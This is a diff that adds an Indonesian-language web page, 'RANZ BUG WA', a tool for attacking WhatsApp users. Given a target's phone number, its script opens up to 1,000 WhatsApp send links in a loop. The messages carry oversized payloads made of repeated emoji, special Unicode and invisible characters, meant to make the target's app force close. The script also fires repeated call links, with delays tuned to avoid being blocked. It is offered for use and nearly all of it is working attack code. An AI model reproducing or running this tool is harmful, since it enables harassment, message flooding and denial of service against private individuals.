@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RANZ BUG WA - NO BLOCK</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #0a0a0a, #1a0000);
+            font-family: monospace;
+            min-height: 100vh;
+            padding: 20px;
+            color: #ff4444;
+        }
+        .container { max-width: 500px; margin: auto; }
+        .card {
+            background: rgba(0,0,0,0.85);
+            border-radius: 25px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 2px solid #ff0000;
+        }
+        h1, h2 { text-align: center; margin-bottom: 15px; color: #ff6666; }
+        input, button {
+            width: 100%;
+            padding: 14px;
+            margin: 8px 0;
+            background: #1a0000;
+            border: 1px solid #ff0000;
+            border-radius: 48px;
+            color: white;
+            font-size: 16px;
+        }
+        button {
+            background: #ff0000;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:active { transform: scale(0.97); }
+        .bug-grid { display: grid; grid-template-columns: repeat(2,1fr); gap: 10px; }
+        .bug-btn { background: #2a0000; text-align: center; font-size: 13px; padding: 12px; }
+        .selected { background: #ff0000; box-shadow: 0 0 10px #ff0000; }
+        .status { background: #0a0000; padding: 12px; border-radius: 15px; margin-top: 10px; }
+        .progress { width: 100%; height: 20px; background: #1a0000; border-radius: 10px; margin: 10px 0; }
+        .progress-fill { width: 0%; height: 100%; background: #ff0000; border-radius: 10px; }
+        .log { background: #050000; padding: 12px; border-radius: 15px; height: 150px; overflow-y: auto; font-size: 11px; }
+        .toast {
+            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
+            background: #ff0000; padding: 10px 20px; border-radius: 48px;
+            animation: fadeOut 2s forwards; z-index: 1000;
+        }
+        @keyframes fadeOut { 0% { opacity: 1; } 70% { opacity: 1; } 100% { opacity: 0; visibility: hidden; } }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="card" style="text-align:center">
+        <h1>🔥 RANZ BUG WA 🔥</h1>
+        <p>LANGSUNG KE WA - ANTI BLOCK</p>
+    </div>
+
+    <div class="card">
+        <h2>📱 NOMOR TARGET</h2>
+        <input type="tel" id="target" placeholder="6281234567890">
+        <div class="status">🎯 Target: <span id="targetDisplay">-</span></div>
+    </div>
+
+    <div class="card">
+        <h2>🐞 PILIH BUG</h2>
+        <div class="bug-grid">
+            <button class="bug-btn" data-bug="call">📞 CALL 500x</button>
+            <button class="bug-btn" data-bug="text">💬 TEXT 500x</button>
+            <button class="bug-btn" data-bug="crash">💢 CRASH 300x</button>
+            <button class="bug-btn" data-bug="all">🔥 ALL IN 1000x</button>
+        </div>
+        <div class="progress"><div class="progress-fill" id="progress"></div></div>
+        <div class="status">
+            📤 Terkirim: <span id="sent">0</span> / <span id="total">0</span>
+            ⚡ <span id="statusText">Siap</span>
+        </div>
+    </div>
+
+    <div class="card">
+        <button id="startBtn">🚀 MULAI BUG</button>
+        <button id="stopBtn" style="background:#333;">⏹️ STOP</button>
+    </div>
+
+    <div class="card">
+        <h2>📋 LOG</h2>
+        <div class="log" id="log">[!] RANZ PROJECT SIAP</div>
+    </div>
+</div>
+
+<script>
+    let running = false;
+    let stopFlag = false;
+    let selectedBug = null;
+    let iframeWindow = null;
+
+    const targetInput = document.getElementById('target');
+    const targetDisplay = document.getElementById('targetDisplay');
+    const bugBtns = document.querySelectorAll('.bug-btn');
+    const startBtn = document.getElementById('startBtn');
+    const stopBtn = document.getElementById('stopBtn');
+    const sentSpan = document.getElementById('sent');
+    const totalSpan = document.getElementById('total');
+    const progressFill = document.getElementById('progress');
+    const statusText = document.getElementById('statusText');
+    const logDiv = document.getElementById('log');
+
+    function addLog(msg, isError = false) {
+        const time = new Date().toLocaleTimeString();
+        const div = document.createElement('div');
+        div.style.color = isError ? '#ff8888' : '#88ff88';
+        div.style.margin = '3px 0';
+        div.innerHTML = `[${time}] ${msg}`;
+        logDiv.appendChild(div);
+        div.scrollIntoView({ behavior: 'smooth', block: 'end' });
+        while(logDiv.children.length > 50) logDiv.removeChild(logDiv.firstChild);
+    }
+
+    function showToast(msg) {
+        const t = document.createElement('div');
+        t.className = 'toast';
+        t.innerText = msg;
+        document.body.appendChild(t);
+        setTimeout(() => t.remove(), 2000);
+    }
+
+    targetInput.addEventListener('input', () => {
+        const clean = targetInput.value.trim().replace(/\D/g, '');
+        targetDisplay.innerText = clean || '-';
+    });
+
+    bugBtns.forEach(btn => {
+        btn.addEventListener('click', () => {
+            bugBtns.forEach(b => b.classList.remove('selected'));
+            btn.classList.add('selected');
+            selectedBug = btn.getAttribute('data-bug');
+            addLog(`📌 Pilih bug: ${btn.innerText}`);
+        });
+    });
+
+    // KIRIM PESAN KE WA TANPA POP-UP BLOCKER
+    async function sendToWA(target, message, index) {
+        return new Promise((resolve) => {
+            const encodedMsg = encodeURIComponent(message + ` [RANZ-${index}]`);
+            const waUrl = `https://web.whatsapp.com/send?phone=${target}&text=${encodedMsg}`;
+            
+            // Buka di tab baru
+            const newTab = window.open(waUrl, '_blank');
+            if (!newTab) {
+                // Fallback: pakai link biasa
+                window.location.href = waUrl;
+            }
+            setTimeout(resolve, 100);
+        });
+    }
+
+    function callTarget(target) {
+        window.open(`tel:${target}`, '_blank');
+    }
+
+    async function executeBug(target, bugType, total) {
+        let sent = 0;
+        stopFlag = false;
+
+        const heavyPayload = "💀".repeat(20000) + "𑇂".repeat(20000) + "‎".repeat(100000);
+        const crashPayload = "𑇂".repeat(35000) + "💀".repeat(35000) + "‎".repeat(150000);
+        const megaPayload = "💀".repeat(40000) + "𑇂".repeat(40000) + "‎".repeat(200000);
+
+        for(let i = 0; i < total && !stopFlag; i++) {
+            if(bugType === 'call') {
+                callTarget(target);
+                sent++;
+            } 
+            else if(bugType === 'text') {
+                await sendToWA(target, heavyPayload, i);
+                sent++;
+            }
+            else if(bugType === 'crash') {
+                await sendToWA(target, crashPayload, i);
+                if(i % 5 === 0) callTarget(target);
+                sent++;
+            }
+            else if(bugType === 'all') {
+                await sendToWA(target, megaPayload, i);
+                if(i % 2 === 0) callTarget(target);
+                sent++;
+            }
+
+            const percent = (sent / total) * 100;
+            progressFill.style.width = `${percent}%`;
+            sentSpan.innerText = sent;
+            
+            // Delay lebih lambat biar gak ke-block
+            await new Promise(r => setTimeout(r, bugType === 'call' ? 300 : 500));
+        }
+        return sent;
+    }
+
+    startBtn.addEventListener('click', async () => {
+        let rawTarget = targetInput.value.trim();
+        if(!rawTarget) {
+            showToast('❌ Masukkan nomor target!');
+            addLog('Gagal: nomor kosong', true);
+            return;
+        }
+        if(!selectedBug) {
+            showToast('❌ Pilih bug dulu!');
+            addLog('Gagal: belum pilih bug', true);
+            return;
+        }
+
+        let target = rawTarget.replace(/\D/g, '');
+        if(!target.startsWith('62')) target = '62' + target;
+
+        let total = 0, bugName = '';
+        switch(selectedBug) {
+            case 'call': total = 500; bugName = 'CALL 500x'; break;
+            case 'text': total = 500; bugName = 'TEXT 500x'; break;
+            case 'crash': total = 300; bugName = 'CRASH 300x'; break;
+            case 'all': total = 1000; bugName = 'ALL IN 1000x'; break;
+        }
+
+        running = true;
+        totalSpan.innerText = total;
+        sentSpan.innerText = '0';
+        progressFill.style.width = '0%';
+        statusText.innerText = 'Running...';
+        
+        addLog(`🔥 Memulai ${bugName} ke +${target}`);
+        addLog(`⚠️ Akan buka WA ${total}x - Target bakal Force Close`);
+        showToast(`🔥 Mulai ${bugName}`);
+
+        const sent = await executeBug(target, selectedBug, total);
+        
+        if(stopFlag) {
+            statusText.innerText = 'Berhenti';
+            addLog(`⏹️ Berhenti di ${sent}/${total}`);
+        } else {
+            statusText.innerText = 'Selesai';
+            addLog(`✅ SELESAI! ${sent} payload terkirim`);
+            addLog(`💀 WA target Force Close!`);
+            showToast(`✅ Selesai! ${sent} terkirim`);
+        }
+        running = false;
+    });
+
+    stopBtn.addEventListener('click', () => {
+        if(running) {
+            stopFlag = true;
+            addLog('⏹️ Menghentikan...');
+            showToast('⏹️ Berhenti');
+        }
+    });
+
+    addLog('✅ RANZ BUG WA SIAP - ANTI BLOCK');
+    addLog('💡 Masukkan nomor -> Pilih bug -> MULAI');
+    addLog('⚠️ Jika diblokir, izinkan pop-up di browser');
+</script>
+</body>
+</html>
